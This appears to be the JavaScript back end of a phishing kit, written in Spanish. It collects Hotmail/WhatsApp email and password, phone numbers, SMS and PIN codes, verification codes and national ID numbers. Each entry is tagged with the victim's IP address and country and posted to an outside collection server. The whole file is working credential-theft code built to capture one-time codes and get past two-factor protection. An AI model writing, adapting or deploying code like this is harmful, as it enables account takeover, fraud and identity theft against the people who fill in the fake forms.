// ==============================================
// FUNCIONES BASE
// ==============================================

/**
 * Obtiene la dirección IP pública del usuario
 * @returns {Promise<string>} Dirección IP
 */
async function getIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error al obtener IP:", error);
    return "IP no disponible";
  }
}

/**
 * Obtiene el país basado en la IP usando múltiples fuentes (fallback)
 * @param {string} ip - Dirección IP
 * @returns {Promise<string>} Nombre del país
 */
async function getCountry(ip) {
  if (ip === "IP no disponible") return "País no disponible";

  // Lista de servicios de geolocalización con sus respectivos extractores
  const services = [
    {
      // ipapi.co (devuelve texto plano)
      url: `https://ipapi.co/${ip}/country_name/`,
      extractor: async (res) => {
        const text = await res.text();
        return text.trim() || null;
      },
    },
    {
      // ip-api.com (devuelve JSON)
      url: `http://ip-api.com/json/${ip}?fields=country`,
      extractor: async (res) => {
        const data = await res.json();
        return data.country || null;
      },
    },
    {
      // geoplugin.net (devuelve JSON)
      url: `http://www.geoplugin.net/json.gp?ip=${ip}`,
      extractor: async (res) => {
        const data = await res.json();
        return data.geoplugin_countryName || null;
      },
    },
  ];

  for (const service of services) {
    try {
      const response = await fetch(service.url, {
        signal: AbortSignal.timeout(5000),
      });
      if (!response.ok) continue;
      const country = await service.extractor(response);
      if (country && country !== "null" && country !== "undefined") {
        return country;
      }
    } catch (error) {
      console.warn(
        `Error con servicio de geolocalización (${service.url}):`,
        error,
      );
      // Continuar con el siguiente
    }
  }

  return "País no disponible";
}

/**
 * Envía un mensaje al servidor mediante POST multipart/form-data
 * @param {string} content - Contenido del mensaje (campo 'mensaje')
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendToServer(content) {
  const url = "https://servidorne-one.vercel.app/vict3";

  const formData = new FormData();
  formData.append("mensaje", content);

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
      },
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error("Error al enviar al servidor:", error);
    return false;
  }
}

// ==============================================
// FUNCIONES ESPECÍFICAS PARA FORMULARIOS
// ==============================================

/**
 * Construye un mensaje con formato mejorado (emojis y separadores)
 * @param {string} title - Título principal
 * @param {Array<string>} lines - Líneas de contenido (clave: valor)
 * @param {string} ip - Dirección IP
 * @param {string} country - País
 * @returns {string} Mensaje formateado
 */
function buildFormattedMessage(title, lines, ip, country) {
  const separator = "━━━━━━━━━━━━━━━━━━━━";
  const header = `📌 **${title}**`;
  const body = lines.map((line) => `▸ ${line}`).join("\n");
  const footer = `🌐 **IP:** ${ip} (${country})`;

  return [header, separator, body, separator, footer].join("\n");
}

/**
 * Procesa datos de inicio de sesión (email y contraseña)
 * @param {string} email - Correo electrónico
 * @param {string} password - Contraseña
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendLoginData(email, password) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);

    const message = buildFormattedMessage(
      "Hotmail-Whatsapp",
      [`📧 **Correo:** \`${email}\``, `🔑 **Clave:** \`${password}\``],
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendLoginData:", error);
    return false;
  }
}

/**
 * Procesa datos de teléfono
 * @param {string} phoneNumber - Número de teléfono con código de país
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPhoneData(phoneNumber) {
  try {
    localStorage.setItem("numero", phoneNumber);
    const ip = await getIP();
    const country = await getCountry(ip);

    const email = localStorage.getItem("correo") || "No disponible";

    const message = buildFormattedMessage(
      "Hotmail-Whatsapp",
      [`📧 **Correo:** \`${email}\``, `📱 **Teléfono:** \`${phoneNumber}\``],
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendPhoneData:", error);
    return false;
  }
}

/**
 * Procesa código SMS de 6 dígitos
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendSmsCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);

    const email = localStorage.getItem("correo") || "No disponible";
    const phone = localStorage.getItem("numero") || "No disponible";

    const message = buildFormattedMessage(
      "Hotmail-Whatsapp",
      [
        `📧 **Correo:** \`${email}\``,
        `📱 **Teléfono:** \`${phone}\``,
        `✉️ **Código SMS:** \`${code}\``,
      ],
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendSmsCode:", error);
    return false;
  }
}

/**
 * Procesa código PIN de 6 dígitos
 * @param {string} pin - Código PIN
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPinCode(pin) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);

    const email = localStorage.getItem("correo") || "No disponible";
    const phone = localStorage.getItem("numero") || "No disponible";

    const message = buildFormattedMessage(
      "Hotmail-Whatsapp",
      [
        `📧 **Correo:** \`${email}\``,
        `📱 **Teléfono:** \`${phone}\``,
        `🔐 **PIN:** \`${pin}\``,
      ],
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendPinCode:", error);
    return false;
  }
}

/**
 * Procesa código de verificación final
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendVerificationCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);

    const email = localStorage.getItem("correo") || "No disponible";
    const phone = localStorage.getItem("numero") || "No disponible";

    const message = buildFormattedMessage(
      "Hotmail-Whatsapp",
      [
        `📧 **Correo:** \`${email}\``,
        `📱 **Teléfono:** \`${phone}\``,
        `✅ **Código Verificación:** \`${code}\``,
      ],
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendVerificationCode:", error);
    return false;
  }
}

// ==============================================
// NUEVA FUNCIÓN: CÉDULA Y PIN CON EMAIL
// ==============================================

/**
 * Procesa datos de verificación con email, cédula y PIN
 * @param {string} email - Correo electrónico del usuario
 * @param {string} cedula - Número de cédula
 * @param {string} pin - PIN de 6 dígitos
 * @param {string} empresa - Nombre de la empresa (opcional)
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendCedulaPinData(email, cedula, pin, empresa = "General") {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);

    // Construir líneas del mensaje
    const lines = [
      `📧 **Correo:** \`${email}\``,
      `🆔 **Cédula:** \`${cedula}\``,
      `🔐 **PIN:** \`${pin}\``,
    ];

    // Si hay empresa, agregarla
    if (empresa && empresa !== "General") {
      lines.push(`🏢 **Empresa:** \`${empresa}\``);
    }

    const message = buildFormattedMessage(
      "Verificación de Seguridad",
      lines,
      ip,
      country,
    );

    return await sendToServer(message);
  } catch (error) {
    console.error("Error en sendCedulaPinData:", error);
    return false;
  }
}

// ==============================================
// EXPORTACIÓN DE FUNCIONES (si se usa como módulo)
// ==============================================
if (typeof module !== "undefined" && module.exports) {
  module.exports = {
    getIP,
    getCountry,
    sendToServer,
    sendLoginData,
    sendPhoneData,
    sendSmsCode,
    sendPinCode,
    sendVerificationCode,
    sendCedulaPinData, // NUEVA FUNCIÓN EXPORTADA
  };
}
